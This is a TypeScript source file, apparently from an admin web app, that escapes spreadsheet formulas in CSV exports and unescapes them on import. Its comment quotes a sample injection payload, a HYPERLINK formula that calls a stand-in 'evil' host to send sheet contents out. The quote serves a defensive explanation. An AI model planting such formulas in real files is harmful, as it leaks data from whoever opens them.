// Formula injection, both directions, for every CSV the admin surfaces write
// or read.
//
// A spreadsheet EVALUATES a cell that starts with = + - @ (or a tab / CR), so
// an export must never hand one over raw: audit_log.user_agent is whatever any
// caller sent, helpdesk topics land in entity_id, and every free-text admin
// column is typed by someone. =HYPERLINK("https://evil/?"&A2) in the audit
// export -- the file opened during an incident -- sends that sheet off the
// machine. PapaParse's escapeFormulae prefixes such a cell with an apostrophe,
// which Excel and LibreOffice treat as "this is text" and do not display.
//
// The apostrophe is then undone on IMPORT, so exporting a table, editing it in
// a spreadsheet and importing it back does not grow a "'" on every phone
// number (they start with "+") or formula-looking name.

/** Pass to every Papa.unparse(...) call that produces a download. */
export const CSV_EXPORT_OPTIONS = { escapeFormulae: true } as const;

const ESCAPED_FORMULA = /^'[=+\-@\t\r]/;

/** Reverse escapeFormulae for one imported cell. */
export function unescapeFormulaCell(value: string): string {
  return ESCAPED_FORMULA.test(value) ? value.slice(1) : value;
}
